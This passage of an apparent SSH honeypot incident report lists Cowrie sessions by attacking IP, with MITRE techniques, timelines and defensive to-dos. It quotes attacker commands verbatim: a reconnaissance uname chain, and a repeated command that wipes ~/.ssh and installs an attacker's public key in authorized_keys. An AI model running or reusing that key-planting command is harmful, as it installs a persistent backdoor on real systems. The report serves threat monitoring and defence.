| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.command.input` |
| `2026-07-17 07:23:47` | `cowrie.log.closed` |
| `2026-07-17 07:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edb82d7300c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:26 |
| **Last Seen** | 2026-07-17 07:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:26:08` | `cowrie.session.connect` |
| `2026-07-17 07:26:09` | `cowrie.client.version` |
| `2026-07-17 07:26:09` | `cowrie.client.kex` |
| `2026-07-17 07:26:11` | `cowrie.login.success` |
| `2026-07-17 07:26:12` | `cowrie.session.params` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.success` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:12` | `cowrie.command.input` |
| `2026-07-17 07:26:13` | `cowrie.log.closed` |
| `2026-07-17 07:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3b17b26ddb

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-07-17 07:27 |
| **Last Seen** | 2026-07-17 07:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:27:10` | `cowrie.session.connect` |
| `2026-07-17 07:27:11` | `cowrie.client.version` |
| `2026-07-17 07:27:11` | `cowrie.client.kex` |
| `2026-07-17 07:27:14` | `cowrie.login.success` |
| `2026-07-17 07:27:14` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347959e7f22b

| Field | Detail |
|---|---|
| **Source IP** | `61.12.86[.]90` |
| **First Seen** | 2026-07-17 07:27 |
| **Last Seen** | 2026-07-17 07:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:27:24` | `cowrie.session.connect` |
| `2026-07-17 07:27:25` | `cowrie.client.version` |
| `2026-07-17 07:27:25` | `cowrie.client.kex` |
| `2026-07-17 07:27:27` | `cowrie.login.success` |
| `2026-07-17 07:27:28` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.86[.]90` to AbuseIPDB if not already reported
- [ ] Block `61.12.86[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b5e44f743b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 07:27 |
| **Last Seen** | 2026-07-17 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:27:39` | `cowrie.session.connect` |
| `2026-07-17 07:27:39` | `cowrie.client.version` |
| `2026-07-17 07:27:39` | `cowrie.client.kex` |
| `2026-07-17 07:27:39` | `cowrie.login.success` |
| `2026-07-17 07:27:39` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:27:39` | `cowrie.direct-tcpip.data` |
| `2026-07-17 07:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d283aa217445

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:29 |
| **Last Seen** | 2026-07-17 07:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:29:11` | `cowrie.session.connect` |
| `2026-07-17 07:29:11` | `cowrie.client.version` |
| `2026-07-17 07:29:11` | `cowrie.client.kex` |
| `2026-07-17 07:29:13` | `cowrie.login.success` |
| `2026-07-17 07:29:16` | `cowrie.session.params` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.success` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.command.input` |
| `2026-07-17 07:29:16` | `cowrie.log.closed` |
| `2026-07-17 07:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1dffe4ac6bd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:32 |
| **Last Seen** | 2026-07-17 07:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:32:27` | `cowrie.session.connect` |
| `2026-07-17 07:32:27` | `cowrie.client.version` |
| `2026-07-17 07:32:27` | `cowrie.client.kex` |
| `2026-07-17 07:32:33` | `cowrie.login.success` |
| `2026-07-17 07:32:35` | `cowrie.session.params` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.success` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:35` | `cowrie.command.input` |
| `2026-07-17 07:32:36` | `cowrie.log.closed` |
| `2026-07-17 07:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2082cc068a93

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-07-17 07:32 |
| **Last Seen** | 2026-07-17 07:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:32:58` | `cowrie.session.connect` |
| `2026-07-17 07:32:58` | `cowrie.client.version` |
| `2026-07-17 07:32:59` | `cowrie.client.kex` |
| `2026-07-17 07:33:00` | `cowrie.login.success` |
| `2026-07-17 07:33:01` | `cowrie.session.params` |
| `2026-07-17 07:33:01` | `cowrie.command.input` |
| `2026-07-17 07:33:01` | `cowrie.command.failed` |
| `2026-07-17 07:33:01` | `cowrie.log.closed` |
| `2026-07-17 07:33:02` | `cowrie.session.params` |
| `2026-07-17 07:33:02` | `cowrie.command.input` |
| `2026-07-17 07:33:02` | `cowrie.session.file_download` |
| `2026-07-17 07:33:02` | `cowrie.log.closed` |
| `2026-07-17 07:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0f516b6ac4

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-07-17 07:33 |
| **Last Seen** | 2026-07-17 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:33:03` | `cowrie.session.connect` |
| `2026-07-17 07:33:03` | `cowrie.client.version` |
| `2026-07-17 07:33:03` | `cowrie.client.kex` |
| `2026-07-17 07:33:04` | `cowrie.login.success` |
| `2026-07-17 07:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a400579d81

| Field | Detail |
|---|---|
| **Source IP** | `203.145.143[.]163` |
| **First Seen** | 2026-07-17 07:33 |
| **Last Seen** | 2026-07-17 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:33:04` | `cowrie.session.connect` |
| `2026-07-17 07:33:04` | `cowrie.client.version` |
| `2026-07-17 07:33:05` | `cowrie.client.kex` |
| `2026-07-17 07:33:06` | `cowrie.login.success` |
| `2026-07-17 07:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.143[.]163` to AbuseIPDB if not already reported
- [ ] Block `203.145.143[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1feb8d56159

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 07:34 |
| **Last Seen** | 2026-07-17 07:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:34:00` | `cowrie.session.connect` |
| `2026-07-17 07:34:00` | `cowrie.client.version` |
| `2026-07-17 07:34:00` | `cowrie.client.kex` |
| `2026-07-17 07:34:03` | `cowrie.login.success` |
| `2026-07-17 07:34:03` | `cowrie.session.params` |
| `2026-07-17 07:34:03` | `cowrie.command.input` |
| `2026-07-17 07:34:04` | `cowrie.log.closed` |
| `2026-07-17 07:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff178ac8f7f2

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-17 07:35 |
| **Last Seen** | 2026-07-17 07:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:35:45` | `cowrie.session.connect` |
| `2026-07-17 07:35:46` | `cowrie.client.version` |
| `2026-07-17 07:35:46` | `cowrie.client.kex` |
| `2026-07-17 07:35:49` | `cowrie.login.success` |
| `2026-07-17 07:35:49` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c35df8714a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-17 07:35 |
| **Last Seen** | 2026-07-17 07:36 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:35:46` | `cowrie.session.connect` |
| `2026-07-17 07:35:48` | `cowrie.client.version` |
| `2026-07-17 07:35:48` | `cowrie.client.kex` |
| `2026-07-17 07:35:58` | `cowrie.login.success` |
| `2026-07-17 07:36:04` | `cowrie.session.params` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.success` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:04` | `cowrie.command.input` |
| `2026-07-17 07:36:05` | `cowrie.log.closed` |
| `2026-07-17 07:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0352192a0be

| Field | Detail |
|---|---|
| **Source IP** | `103.174.80[.]40` |
| **First Seen** | 2026-07-17 07:35 |
| **Last Seen** | 2026-07-17 07:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:35:59` | `cowrie.session.connect` |
| `2026-07-17 07:36:00` | `cowrie.client.version` |
| `2026-07-17 07:36:00` | `cowrie.client.kex` |
| `2026-07-17 07:36:02` | `cowrie.login.success` |
| `2026-07-17 07:36:03` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.80[.]40` to AbuseIPDB if not already reported
- [ ] Block `103.174.80[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54c0e934c26

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]165` |
| **First Seen** | 2026-07-17 07:36 |
| **Last Seen** | 2026-07-17 07:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:36:08` | `cowrie.session.connect` |
| `2026-07-17 07:36:08` | `cowrie.client.version` |
| `2026-07-17 07:36:08` | `cowrie.client.kex` |
| `2026-07-17 07:36:09` | `cowrie.login.success` |
| `2026-07-17 07:36:10` | `cowrie.session.params` |
| `2026-07-17 07:36:10` | `cowrie.command.input` |
| `2026-07-17 07:36:10` | `cowrie.command.failed` |
| `2026-07-17 07:36:10` | `cowrie.log.closed` |
| `2026-07-17 07:36:10` | `cowrie.session.params` |
| `2026-07-17 07:36:10` | `cowrie.command.input` |
| `2026-07-17 07:36:11` | `cowrie.session.file_download` |
| `2026-07-17 07:36:11` | `cowrie.log.closed` |
| `2026-07-17 07:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]165` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ff190335b1

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]165` |
| **First Seen** | 2026-07-17 07:36 |
| **Last Seen** | 2026-07-17 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:36:11` | `cowrie.session.connect` |
| `2026-07-17 07:36:11` | `cowrie.client.version` |
| `2026-07-17 07:36:11` | `cowrie.client.kex` |
| `2026-07-17 07:36:11` | `cowrie.login.success` |
| `2026-07-17 07:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]165` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eccc001bc29

| Field | Detail |
|---|---|
| **Source IP** | `159.89.109[.]165` |
| **First Seen** | 2026-07-17 07:36 |
| **Last Seen** | 2026-07-17 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:36:11` | `cowrie.session.connect` |
| `2026-07-17 07:36:11` | `cowrie.client.version` |
| `2026-07-17 07:36:11` | `cowrie.client.kex` |
| `2026-07-17 07:36:12` | `cowrie.login.success` |
| `2026-07-17 07:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.109[.]165` to AbuseIPDB if not already reported
- [ ] Block `159.89.109[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9583b172350

| Field | Detail |
|---|---|
| **Source IP** | `179.179.199[.]138` |
| **First Seen** | 2026-07-17 07:38 |
| **Last Seen** | 2026-07-17 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:38:03` | `cowrie.session.connect` |
| `2026-07-17 07:38:03` | `cowrie.client.version` |
| `2026-07-17 07:38:04` | `cowrie.client.kex` |
| `2026-07-17 07:38:04` | `cowrie.login.success` |
| `2026-07-17 07:38:05` | `cowrie.session.params` |
| `2026-07-17 07:38:05` | `cowrie.command.input` |
| `2026-07-17 07:38:05` | `cowrie.command.failed` |
| `2026-07-17 07:38:05` | `cowrie.log.closed` |
| `2026-07-17 07:38:06` | `cowrie.session.params` |
| `2026-07-17 07:38:06` | `cowrie.command.input` |
| `2026-07-17 07:38:06` | `cowrie.session.file_download` |
| `2026-07-17 07:38:06` | `cowrie.log.closed` |
| `2026-07-17 07:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.179.199[.]138` to AbuseIPDB if not already reported
- [ ] Block `179.179.199[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0c23753121

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-07-17 07:38 |
| **Last Seen** | 2026-07-17 07:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 07:38:06` | `cowrie.session.connect` |
| `2026-07-17 07:38:06` | `cowrie.client.version` |
| `2026-07-17 07:38:06` | `cowrie.client.kex` |
| `2026-07-17 07:38:07` | `cowrie.login.success` |
| `2026-07-17 07:38:07` | `cowrie.direct-tcpip.request` |
| `2026-07-17 07:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
